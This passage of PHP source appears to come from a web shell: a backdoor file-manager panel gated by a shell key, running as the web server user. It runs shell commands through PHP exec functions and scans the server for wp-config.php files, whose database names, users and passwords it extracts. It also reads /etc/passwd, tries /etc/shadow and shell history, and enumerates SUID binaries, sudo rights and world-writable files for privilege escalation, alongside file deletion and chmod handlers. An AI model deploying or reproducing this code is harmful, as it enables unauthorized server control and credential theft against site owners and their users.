            $output = execute_shell_command('find /home -perm -002 -type f 2>/dev/null | head -30');
            echo json_encode([
                'success' => !empty(trim($output ?: '')),
                'output' => $output ?: 'No world-writable files in /home found',
                'action' => 'Permission Analysis'
            ]);
            break;

        default:
            echo json_encode([
                'success' => false,
                'error' => 'Unknown privilege escalation action'
            ]);
    }
    exit;
}

// 🔥 SAFE JSON RESPONSE HELPERS
function safe_json_output($data) {
    if (!headers_sent()) {
        header('Content-Type: application/json');
    }
    $json = json_encode($data);
    if ($json === false) {
        $err_msg = function_exists('json_last_error_msg')
            ? json_last_error_msg()
            : 'error code ' . json_last_error();
        echo json_encode([
            'success' => false,
            'error' => 'JSON encoding failed: ' . $err_msg,
            'raw_data_type' => gettype($data)
        ]);
    } else {
        echo $json;
    }
    exit;
}

function safe_json_error($message, $details = '') {
    safe_json_output([
        'success' => false,
        'error' => $message,
        'details' => $details,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
}

// Helper function untuk feature endpoints - ensure valid JSON output
function safe_feature_output($result, $errorMsg = 'Operation failed or returned no data') {
    while (ob_get_level() > 0) { ob_end_clean(); }

    if ($result === null || $result === false || $result === '') {
        safe_json_error($errorMsg);
        return;
    }

    if (is_array($result) || is_object($result)) {
        safe_json_output($result);
        return;
    }

    safe_json_output(['success' => true, 'data' => $result]);
}

// Check if function is available and not disabled
function is_function_available($func) {
    return function_exists($func) && !in_array($func, array_map('trim', explode(',', ini_get('disable_functions'))));
}

// Check if command can be executed
function check_execution_environment() {
    $issues = [];
    
    // Check PHP functions
    $required_funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open'];
    $available_funcs = [];
    foreach ($required_funcs as $func) {
        if (is_function_available($func)) {
            $available_funcs[] = $func;
        }
    }
    
    if (empty($available_funcs)) {
        $issues[] = 'No shell execution functions available. Check disable_functions in php.ini';
    }
    
    // Check safe mode (deprecated but still used)
    if (ini_get('safe_mode')) {
        $issues[] = 'PHP Safe Mode is enabled';
    }
    
    // Check SELinux
    if (file_exists('/sys/fs/selinux/enforce')) {
        $selinux = @file_get_contents('/sys/fs/selinux/enforce');
        if (trim($selinux) === '1') {
            $issues[] = 'SELinux is enforcing (may block commands)';
        }
    }
    
    return [
        'available_functions' => $available_funcs,
        'issues' => $issues,
        'can_execute' => !empty($available_funcs)
    ];
}

// 🔥 OPTIMIZED WEBSITE DISCOVERY FUNCTIONS
// Menggunakan streaming, caching, dan efisiensi I/O

// Cache untuk hasil scan (session-based)
function get_scan_cache_key($type, $pattern, $mode) {
    return 'scan_' . md5($type . $pattern . $mode . session_id());
}

function get_cached_scan($cache_key) {
    if (!isset($_SESSION['scan_cache'])) return null;
    if (!isset($_SESSION['scan_cache'][$cache_key])) return null;
    $cache = $_SESSION['scan_cache'][$cache_key];
    // Cache valid 1 jam
    if (time() - $cache['time'] > 3600) {
        unset($_SESSION['scan_cache'][$cache_key]);
        return null;
    }
    return $cache['data'];
}

function set_cached_scan($cache_key, $data) {
    if (!isset($_SESSION['scan_cache'])) $_SESSION['scan_cache'] = [];
    $_SESSION['scan_cache'][$cache_key] = [
        'time' => time(),
        'data' => $data
    ];
}

// Optimized file scanning dengan GLOB_BRACE
function scan_for_files_optimized($searchPaths, $patterns, $max_depth, $extractTitle, $max_results = 1000) {
    $found_paths = [];
    $results = [];
    $scanned_dirs = 0;
    
    // Gabungkan pattern dengan GLOB_BRACE untuk mengurangi I/O
    $brace_pattern = '{' . implode(',', $patterns) . '}';
    
    foreach ($searchPaths as $basePath) {
        if (!is_dir($basePath) || !is_readable($basePath)) continue;
        
        // Kirim progress
        yield ['type' => 'progress', 'status' => 'scanning', 'current_path' => $basePath, 'found' => count($results)];
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        $iterator->setMaxDepth($max_depth);
        
        foreach ($iterator as $file) {
            $scanned_dirs++;
            
            // Skip system directories
            $pathname = $file->getPathname();
            if (preg_match('/\/(proc|sys|dev|run|boot|lost\+found|tmp|temp)\//', $pathname)) continue;
            
            if ($file->isFile()) {
                // Cek dengan fnmatch untuk wildcard support
                $filename = $file->getFilename();
                foreach ($patterns as $pattern) {
                    if (fnmatch($pattern, $filename, FNM_CASEFOLD)) {
                        $path = $file->getPath();
                        if (isset($found_paths[$path])) continue;
                        $found_paths[$path] = true;
                        
                        $result = analyze_file_match($path, $filename, $extractTitle);
                        $results[] = $result;
                        
                        // Stream hasil langsung
                        yield ['type' => 'result', 'data' => $result];
                        
                        // Limit hasil
                        if (count($results) >= $max_results) {
                            yield ['type' => 'complete', 'status' => 'max_reached', 'total' => count($results), 'scanned' => $scanned_dirs];
                            return;
                        }
                        break;
                    }
                }
            }
            
            // Yield progress setiap 100 item
            if ($scanned_dirs % 100 === 0) {
                yield ['type' => 'progress', 'status' => 'scanning', 'scanned' => $scanned_dirs, 'found' => count($results)];
            }
        }
    }
    
    yield ['type' => 'complete', 'status' => 'done', 'total' => count($results), 'scanned' => $scanned_dirs];
}

// Optimized content scanning dengan memory management
function scan_for_content_optimized($searchPaths, $patterns, $max_depth, $showPreview, $file_extensions, $max_results = 1000) {
    $found_files = [];
    $results = [];
    $scanned_files = 0;
    $max_file_size = 1024 * 1024; // 1MB
    
    // Pre-compile patterns untuk stripos
    $compiled_patterns = array_map('strtolower', $patterns);
    
    foreach ($searchPaths as $basePath) {
        if (!is_dir($basePath) || !is_readable($basePath)) continue;
        
        yield ['type' => 'progress', 'status' => 'scanning', 'current_path' => $basePath, 'found' => count($results)];
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        $iterator->setMaxDepth($max_depth);
        
        foreach ($iterator as $file) {
            if (!$file->isFile()) continue;
            
            $pathname = $file->getPathname();
            
            // Skip system directories
            if (preg_match('/\/(proc|sys|dev|run|boot|lost\+found|tmp|temp)\//', $pathname)) continue;
            
            // Cek ekstensi
            $ext = strtolower($file->getExtension());
            if (!in_array($ext, $file_extensions)) continue;
            
            // Cek ukuran
            if ($file->getSize() > $max_file_size) continue;
            
            $scanned_files++;
            
            // Baca konten dengan batasan
            $content = @file_get_contents($pathname, false, null, 0, 100000); // Max 100KB
            if (!$content) continue;
            
            $content_lower = strtolower($content);
            $matches = [];
            
            foreach ($compiled_patterns as $idx => $pattern) {
                if (strpos($content_lower, $pattern) !== false) {
                    $context = '';
                    if ($showPreview) {
                        $pos = strpos($content_lower, $pattern);
                        $start = max(0, $pos - 100);
                        $len = min(200, strlen($content) - $start);
                        $context = substr($content, $start, $len);
                        $context = str_replace($patterns[$idx], "**{$patterns[$idx]}**", $context);
                    }
                    $matches[] = ['pattern' => $patterns[$idx], 'context' => $context];
                }
            }
            
            if (!empty($matches)) {
                $result = [
                    'path' => $pathname,
                    'type' => 'Content Match',
                    'size' => format_bytes($file->getSize()),
                    'writable' => $file->isWritable(),
                    'matches' => $matches,
                    'preview' => $showPreview
                ];
                $results[] = $result;
                yield ['type' => 'result', 'data' => $result];
                
                if (count($results) >= $max_results) {
                    yield ['type' => 'complete', 'status' => 'max_reached', 'total' => count($results), 'scanned' => $scanned_files];
                    return;
                }
            }
            
            // Progress update
            if ($scanned_files % 100 === 0) {
                yield ['type' => 'progress', 'status' => 'scanning', 'scanned' => $scanned_files, 'found' => count($results)];
                // Clear memory
                unset($content, $content_lower);
                gc_collect_cycles();
            }
        }
    }
    
    yield ['type' => 'complete', 'status' => 'done', 'total' => count($results), 'scanned' => $scanned_files];
}
function format_bytes($bytes) {
    if (!is_numeric($bytes) || $bytes <= 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB'];
    $i = min(floor(log($bytes) / log($k)), count($sizes) - 1);
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}
function get_dir_size($dir) {
    $size = 0;
    if (!is_dir($dir) || !is_readable($dir)) {
        return '0 B';
    }
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }
    } catch (Exception $e) {
        return '0 B';
    }
    return format_bytes($size);
}
function analyze_file_match($path, $marker, $extractTitle) {
    $result = [
        'path' => $path,
        'type' => 'Unknown',
        'marker' => $marker,
        'writable' => is_writable($path),
        'size' => get_dir_size($path),
        'has_title' => false,
        'title' => null
    ];
    if (file_exists($path . '/wp-config.php')) {
        $result['type'] = 'WordPress';
    } elseif (file_exists($path . '/configuration.php')) {
        $result['type'] = 'Joomla';
    } elseif (file_exists($path . '/app/Mage.php')) {
        $result['type'] = 'Magento';
    } elseif (file_exists($path . '/sites/default/settings.php')) {
        $result['type'] = 'Drupal';
    } elseif (glob($path . '/*.php')) {
        $result['type'] = 'PHP Site';
    } elseif (glob($path . '/*.html') || glob($path . '/*.htm')) {
        $result['type'] = 'Static HTML';
    }
    if ($extractTitle) {
        foreach (['index.php', 'index.html', 'index.htm'] as $index) {
            $index_file = $path . '/' . $index;
            if (file_exists($index_file)) {
                $title = extract_website_title($index_file);
                if ($title) {
                    $result['title'] = $title;
                    $result['has_title'] = true;
                }
                break;
            }
        }
    }
    return $result;
}
function extract_website_title($file_path) {
    $content = @file_get_contents($file_path, false, null, 0, 5000);
    if (!$content) return null;
    if (preg_match('/<title[^>]*>([^<]+)<\/title>/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    if (preg_match('/<meta[^>]*name=["\']title["\'][^>]*content=["\']([^"\']+)["\']/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    return null;
}
function find_wp_configs() {
    $configs = [];
    $found_paths = []; // Track found paths to avoid duplicates
    function get_parent_dir($path, $levels) {
        $parent = $path;
        for ($i = 0; $i < $levels; $i++) {
            $new_parent = dirname($parent);
            if ($new_parent === $parent || $new_parent === '/' || empty($new_parent)) {
                return false;
            }
            $parent = $new_parent;
        }
        return $parent;
    }
    $current_dir = getcwd();
    $traversal_paths = [$current_dir];
    for ($i = 1; $i <= 10; $i++) {
        $parent_dir = get_parent_dir($current_dir, $i);
        if ($parent_dir === false) break;
        $traversal_paths[] = $parent_dir;
        $wp_config_path = $parent_dir . DIRECTORY_SEPARATOR . 'wp-config.php';
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
        $common_subdirs = array('wordpress', 'wp', 'html', 'public_html', 'www', 'web', 'site');
        foreach ($common_subdirs as $subdir) {
            $subdir_path = $parent_dir . DIRECTORY_SEPARATOR . $subdir . DIRECTORY_SEPARATOR . 'wp-config.php';
            if (@file_exists($subdir_path) && !in_array($subdir_path, $found_paths)) {
                $content = @file_get_contents($subdir_path);
                if ($content && strpos($content, 'DB_NAME') !== false) {
                    $config = parse_wp_config($content, $subdir_path);
                    if ($config) {
                        $configs[] = $config;
                        $found_paths[] = $subdir_path;
                    }
                }
            }
        }
    }
    $common_locations = array(
        '/var/www/html/wp-config.php',
        '/var/www/wordpress/wp-config.php',
        '/var/www/wp-config.php',
        '/var/www/html/wordpress/wp-config.php',
        '/home/www/wp-config.php',
        '/home/wordpress/wp-config.php',
        '/usr/share/wordpress/wp-config.php',
        '/opt/wordpress/wp-config.php',
        '/srv/www/wp-config.php'
    );
    foreach ($common_locations as $wp_config_path) {
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
    }
    $searched_paths = array_unique(array_merge(
        array('/var/www', '/home', '/opt', '/usr/share', '/srv', '/data'),
        $traversal_paths
    ));
    foreach ($searched_paths as $base_path) {
        if (!@is_dir($base_path)) continue;
        try {
            $dir_iterator = new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS);
            $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
            $count = 0;
            foreach ($iterator as $file) {
                if ($count > 300) break;
                if ($iterator->getDepth() > 2) continue; // Limit depth
                if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                    $filepath = $file->getPathname();
                    if (in_array($filepath, $found_paths)) continue;
                    $content = @file_get_contents($filepath);
                    if ($content && strpos($content, 'DB_NAME') !== false) {
                        $config = parse_wp_config($content, $filepath);
                        if ($config) {
                            $configs[] = $config;
                            $found_paths[] = $filepath;
                        }
                    }
                }
                $count++;
            }
        } catch (Exception $e) {
            continue;
        }
    }
    return $configs;
}
function parse_wp_config($content, $filepath) {
    $config = [
        'filepath' => $filepath,
        'db_host' => 'localhost',
        'db_port' => 3306,
        'db_name' => '',
        'db_user' => '',
        'db_pass' => '',
        'table_prefix' => 'wp_'
    ];
    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_name'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_user'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_pass'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $host_port = $matches[1];
        if (strpos($host_port, ':') !== false) {
            list($config['db_host'], $config['db_port']) = explode(':', $host_port);
        } else {
            $config['db_host'] = $host_port;
        }
    }
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches)) {
        $config['table_prefix'] = $matches[1];
    }
    return $config;
}
if (isset($_POST['action']) && $_POST['action'] === 'navigate_to_dir' && !empty($_POST['target_dir'])) {
    $targetDir = $_POST['target_dir'];
    if (is_dir($targetDir)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($targetDir));
        exit;
    } else {
        $output = "Directory does not exist: " . htmlspecialchars($targetDir);
    }
}

// Check if this is a JSON API endpoint
$isJsonEndpoint = isset($_GET['action']) && in_array($_GET['action'], ['firewall_status', 'port_list', 'hash_text', 'session_info', 'ftp_status', 'ftp_enable', 'ftp_disable', 'ftp_restart', 'ftp_config', 'ftp_logs', 'ftp_user_create', 'ftp_user_list', 'ftp_user_delete', 'ftp_user_password', 'ftp_user_enable', 'ftp_user_disable', 'ftp_user_directory', 'ftp_security', 'ftp_backup', 'fm_search', 'fm_grep', 'fm_file_info', 'fm_dir_tree', 'fm_list_archive', 'fm_tail', 'fm_autocomplete', 'fm_preview', 'fm_bulk_download', 'fm_exec']);

if (!$isJsonEndpoint) {
    header("X-Robots-Tag: noindex, nofollow", true);
    header("Content-Type: text/html; charset=utf-8");
}
 $dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
 $dir = rtrim($dir, '/\\');
 $output = '';
 $renameTarget = isset($_POST['rename_target']) ? $_POST['rename_target'] : null;
 $server_info = php_uname('a');
 $software_info = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
 $php_version = phpversion();
 $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME']);
 $default_dir = getcwd();

 // Current user information (safe fallbacks for disabled functions)
 $current_user = 'www-data';
 if (function_exists('shell_exec') && strpos(ini_get('disable_functions'), 'shell_exec') === false) {
     $exec_user = trim(@shell_exec('whoami 2>/dev/null'));
     if ($exec_user) $current_user = $exec_user;
 }

 $user_id = 'uid=33';
 if (function_exists('shell_exec') && strpos(ini_get('disable_functions'), 'shell_exec') === false) {
     $exec_id = trim(@shell_exec('id 2>/dev/null'));
     if ($exec_id) $user_id = $exec_id;
 }

 $home_dir = getcwd() ?: '/var/www/html';
 if (function_exists('shell_exec') && strpos(ini_get('disable_functions'), 'shell_exec') === false) {
     $exec_home = trim(@shell_exec('echo $HOME 2>/dev/null'));
     if ($exec_home) $home_dir = $exec_home;
 }
 $user_info = "👤 User: $current_user | ID: $user_id | Home: $home_dir";

function generate_breadcrumbs($path) {
    global $default_dir;
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = '<a href="?masuk=' . AL_SHELL_KEY . '&d=/">Root</a> / ';
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a> / ';
    }
    $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($default_dir) . '" title="Return to default directory">[Default]</a>';
    return rtrim($breadcrumbs, ' / ');
}


// Wrapper for backward compatibility
function execute_shell_command($cmd) {
    $result = execute_command_with_timeout($cmd, 30);

    if ($result['warning']) {
        $output = $result['output'];
        if ($result['error']) {
            $output .= "\nSTDERR:\n" . $result['error'];
        }
        if ($result['timed_out']) {
            $output .= "\n\n[WARNING] Command timed out after 30 seconds, showing partial results";
        }
        return $output;
    }

    $output = $result['output'];
    if ($result['error']) {
        $output .= "\nSTDERR:\n" . $result['error'];
    }
    return $output;
}

// Helper function to filter command output for server info
function filter_command_output($output) {
    if (empty($output)) return "-";
    
    // Check if output is error message about disabled functions
    if (strpos($output, 'All shell execution methods failed') !== false ||
        strpos($output, 'are disabled') !== false) {
        return "-"; // Return simple dash for disabled functions
    }
    
    $lines = explode("\n", $output);
    $filtered = [];
    $skip_patterns = [
        '/Permission denied/i',
        '/No such file or directory/i',
        '/cannot access/i',
        '/not accessible/i',
        '/Operation not permitted/i',
        '/Input\/output error/i',
        '/Invalid argument/i'
    ];
    
    foreach ($lines as $line) {
        $skip = false;
        foreach ($skip_patterns as $pattern) {
            if (preg_match($pattern, $line)) {
                $skip = true;
                break;
            }
        }
        if (!$skip) {
            $filtered[] = $line;
        }
    }
    
    $result = implode("\n", $filtered);
    return $result ?: "-";
}

function get_detailed_server_info() {
    $info = "";

    // Current User Information (Enhanced)
    $current_user = trim(execute_shell_command("whoami"));
    $user_id = trim(execute_shell_command("id"));
    $home_dir = trim(execute_shell_command("echo $HOME"));
    $shell = trim(execute_shell_command("echo $SHELL"));
    $sudo_status = trim(execute_shell_command("sudo -l 2>/dev/null | head -1"));
    $groups = trim(execute_shell_command("groups"));

    $user_info_lines = [
        "Current User: " . htmlspecialchars($current_user),
        "ID Info: " . htmlspecialchars($user_id),
        "Home: " . htmlspecialchars($home_dir),
        "Shell: " . htmlspecialchars($shell),
        "Groups: " . htmlspecialchars($groups),
        "Sudo: " . (strpos($sudo_status, 'may run') !== false ? htmlspecialchars($sudo_status) : 'No sudo access')
    ];

    $user_info_html = "<div style='background:#0a2a0a;border:2px solid #0f0;padding:10px;margin-bottom:10px;border-radius:4px;'>";
    $user_info_html .= "<strong style='color:#0f0;font-size:11.5px;display:block;margin-bottom:8px;'>👤 CURRENT USER:</strong>";
    foreach ($user_info_lines as $line) {
        $user_info_html .= "<div style='color:#0f0;font-family:monospace;font-size:10.5px;padding:3px 0;'>" . $line . "</div>";
    }
    $user_info_html .= "</div>";

    $info .= $user_info_html;

    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg 2>/dev/null | tail -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sysctl -a 2>/dev/null | head -n 50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("whoami && id"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/passwd 2>/dev/null || echo 'Cannot read /etc/passwd'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/group 2>/dev/null || echo 'Cannot read /etc/group'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ip a 2>/dev/null || ifconfig 2>/dev/null || echo 'No network info available'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo 'No socket info available'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("arp -a 2>/dev/null || ip neigh 2>/dev/null || echo 'No ARP info'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("route -n 2>/dev/null || ip route 2>/dev/null || echo 'No routing info'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ps aux 2>/dev/null | head -50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("top -bn1 2>/dev/null | head -30"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -20 || echo 'systemctl not found.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("crontab -l 2>/dev/null || echo 'No crontab for this user.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/cron* /var/spool/cron 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("df -h 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("mount 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -2000 -type f 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /tmp /var/tmp -writable -type f 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file() ?: 'Unknown') . "\n" . htmlspecialchars(filter_command_output(execute_shell_command("php -i 2>/dev/null | grep 'Configuration File'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("python --version 2>&1; python3 --version 2>&1; perl -v 2>/dev/null | head -n 2; ruby -v 2>&1; gcc --version 2>/dev/null | head -n 1; nginx -v 2>&1; apache2 -v 2>&1 || httpd -v 2>&1"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /home/ 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/ssh/ 2>/dev/null; echo '---'; cat /etc/ssh/sshd_config 2>/dev/null | head -50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc /usr/local/etc -type f -name '*.conf' 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc -type f \( -name '*.pwd' -o -name '*password*' \) 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat ~/.bash_history 2>/dev/null | tail -50; echo '--'; cat ~/.nano_history 2>/dev/null | tail -20"))) . "</pre></div>";
    return $info;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_target']);
    $permission = $_POST['chmod_perm'];
    $recursive = isset($_POST['chmod_recursive']) ? '-R' : '';
    if (is_dir($targetFile) && empty($recursive)) {
        $command = "chmod " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    } else {
        $command = "chmod " . $recursive . " " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    }
    execute_shell_command($command);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'zip_selected' && !empty($_POST['selected_files'])) {
    $zipName = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($dir . DIRECTORY_SEPARATOR . $zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($_POST['selected_files'] as $file) {
            $filePath = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($filePath)) {
                $zip->addFile($filePath, basename($filePath));
            } elseif (is_dir($filePath)) {
                $zip->addEmptyDir(basename($filePath));
                $baseDir = basename($filePath);
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $fileInfo) {
                    if ($fileInfo->isDot()) continue;
                    // Get relative path from inner iterator
                    $subPath = $iterator->getInnerIterator()->getSubPathname();
                    $localPath = $baseDir . '/' . $subPath;
                    if ($fileInfo->isDir()) {
                        $zip->addEmptyDir($localPath);
                    } else {
                        $zip->addFile($fileInfo->getRealPath(), $localPath);
                    }
                }
            }
        }
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'delete_selected' && !empty($_POST['selected_files'])) {
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        if (is_dir($targetPath)) {
            @rmdir_recursive($targetPath);
        } else {
            @unlink($targetPath);
        }
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POST['selected_files'])) {
    header('Content-Type: application/json');
    $permission = isset($_POST['chmod_perm']) ? $_POST['chmod_perm'] : '644';
    $recursive = isset($_POST['chmod_recursive']) && $_POST['chmod_recursive'] === '1';
    
    $results = [
        'success' => true,
        'total' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        'processed' => [],
        'errors' => []
    ];
    
    // Function to recursively chmod
    function chmod_recursive($path, $permission, &$results) {
